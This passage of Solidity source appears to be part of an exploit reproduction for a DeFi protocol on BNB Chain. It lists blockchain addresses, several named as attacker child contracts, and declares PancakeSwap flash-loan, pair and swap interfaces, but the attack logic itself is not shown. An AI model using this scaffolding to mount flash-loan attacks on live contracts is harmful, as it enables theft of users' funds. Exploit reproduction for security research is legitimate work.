    address internal constant A_C212B2_FBA8 = 0xc212B2d094e8fF05cE42584199802Ed75143fbA8;
    address internal constant attack_child_36D4 = 0xC26D1570D61d1db6758Bfa1B3Fbe24B3695536d4;
    address internal constant A_C2778B_949F = 0xC2778B4a0A9f5140b10df9743d8FE9baca8C949f;
    address internal constant A_C33992_71C5 = 0xc33992940deFF90b28F4878291D6364A0b4971c5;
    address internal constant A_C47182_F3AB = 0xC47182AE5af704487130D8B0bF5120b2D763f3AB;
    address internal constant PancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant A_CA24EC_ED20 = 0xCA24ecb6C95aFbe30a683177B20cf6B856A5ed20;
    address internal constant A_CB2852_3715 = 0xcb28523ad7020826d1f2B5d64E8Acc0c24063715;
    address internal constant A_CBAD7C_BF0F = 0xCBAd7C01eFf21c2B3D784D36a543fAfD9fd2bf0f;
    address internal constant A_CD167A_71C7 = 0xcd167a9219aF5b3ca5727243F1292a4fAD7c71c7;
    address internal constant A_CD2C34_8EC3 = 0xcd2c34F85bbe0452bF19e8eC07879e384af68EC3;
    address internal constant A_CFD2BE_0940 = 0xcfd2Bedf9Be81b83fdF086E17BD46F9B1bfE0940;
    address internal constant A_D00111_557A = 0xD00111850D60A70FB966BF6819369664C79b557A;
    address internal constant A_D015BB_14D4 = 0xd015bb77bAfb2E1323501c077031b4C476F214d4;
    address internal constant attack_child_9F3F = 0xD05B658F9b15CD87D23EF004f512eF096e929f3F;
    address internal constant attack_child_231E = 0xd0874aAb59131259F6b6c1CbC199F2af5499231E;
    address internal constant A_D173AC_EDD6 = 0xD173Acc8dCcD8790916C12F688355EA29784eDD6;
    address internal constant attack_child_C8EF = 0xD2fB16432314C3a974C6FaaD24680971Aea3c8eF;
    address internal constant attack_child_AE9F = 0xD38c3a8930E20C141A00dD06EcbeEa91e3D4ae9F;
    address internal constant attack_child_E854 = 0xd3D62C325463f94e4C60f8a596A7Ca6B547Ee854;
    address internal constant A_D4B203_932A = 0xD4B203452d519815B561F1a7Ea43Ce277dD6932a;
    address internal constant attack_child_38C7 = 0xD56bC68aD3D640B6197C74B18181656b539138C7;
    address internal constant attack_child_B881 = 0xD576a590113Cc56Dfaaf8EC21dd54c7091FBb881;
    address internal constant A_D5DEB2_5083 = 0xD5DEB2992B70E0992c97B308f90AF01676BF5083;
    address internal constant A_D5F056_F92F = 0xD5F05644EF5d0a36cA8C8B5177FfBd09eC63F92F;
    address internal constant attack_child_CA02 = 0xD6E6d794e0F79b3F511FcC33BE3B13125402Ca02;
    address internal constant A_DB1BD8_6F3B = 0xdB1BD80e70Ddcbf54718A83AB2F729E6aC006F3B;
    address internal constant A_DF61B4_2054 = 0xDF61B479B07D6D7b69F7f063C5A427958ed82054;
    address internal constant A_E036F6_839E = 0xe036F6E8505d5DE3D219ca4A08cc5Dc4E33D839E;
    address internal constant attack_child_3A78 = 0xE0c16564aeEe59c800fcF0dED70507D09fcf3A78;
    address internal constant A_E171FB_8B9C = 0xE171fB5A15Af1F1E9c2Ed6641528A2fba7798B9c;
    address internal constant A_E28FC3_9560 = 0xE28fC32Cec84B6DC87e401040A6E7ED5cD269560;
    address internal constant attack_child_8793 = 0xE2aFFB5368837085d2D47F16477552ea7B098793;
    address internal constant attack_child_C9E0 = 0xe5F94ae67f0a042D2ee7637503456DD79AefC9E0;
    address internal constant attack_child_9F0D = 0xE75Ae96368bEADdE686eD1e0F4F4cC950A6c9F0d;
    address internal constant A_E76193_CDC7 = 0xe761930f4565977EEBd13550aC3dccF98D97cDC7;
    address internal constant A_E85A7D_D2CD = 0xe85a7D716C60F24818fe37dBab7C96B286f1d2cd;
    address internal constant A_E9C129_5612 = 0xe9C12962a2E2eac0Fe29f158A1001F4EB4295612;
    address internal constant attack_child_3D7E = 0xebf72E2A85Da3678F0A0551aA230DE918a6C3d7E;
    address internal constant attack_child_D42E = 0xEEeC6AC6730A89bF4310dfFc0f2A578E6F08d42E;
    address internal constant A_EF34F9_3884 = 0xEF34f908326BF64bCf78B3eb85581fd14Dc63884;
    address internal constant A_EF7F8D_CD93 = 0xeF7f8df9A1C3418EB6C0e161CD6Fc2B8a327CD93;
    address internal constant attack_child_FC22 = 0xF22D88aaF6300ae49De9b3B3dd3ffAf11EBffc22;
    address internal constant A_F645B0_0419 = 0xf645b0832EadeE352909904e644E17A5DAC50419;
    address internal constant A_F6A025_7333 = 0xF6a0253625aaa1875Ac1999BdEb22bD043367333;
    address internal constant A_F734C4_BB24 = 0xF734c49Df9A19E9389413D80168F1f075eBfBb24;
    address internal constant attack_child_9773 = 0xF79Bc096bac651EB460166D84c46f7c94EB39773;
    address internal constant A_F873DE_4B7C = 0xf873dE78690Bb8aa50D8c865F5Ee4ed3ae2b4B7c;
    address internal constant A_FA13F3_8D59 = 0xfa13F3985276025aA804FBB68e814A3B78Ea8D59;
    address internal constant attack_child_79D7 = 0xfCF2EDc1977045585dc04ff173a49408eEF279D7;
    address internal constant A_FD1984_2715 = 0xfd1984B7fbcFB857B01Fc6d2388D60e027F72715;
    address internal constant A_FD4D97_946F = 0xfD4D972fB90f0853e091bFC2878A47e49016946F;
    address internal constant A_FDAB6C_1BCF = 0xfdAb6C4C5B1868041F5C1c0A72195DB4Cb1c1bcF;
    address internal constant A_FF7C6D_3B22 = 0xFf7C6D1086c9150F28Ae907FA466c2E29bE43b22;
}

interface IPancakeV3Factory {
    function getPool(address, address, uint24) external view returns (uint256);
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IPancakeFactory {
    function getPair(address, address) external view returns (uint256);
}

interface IPancakeRouter {
    function factory() external view returns (uint256);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}
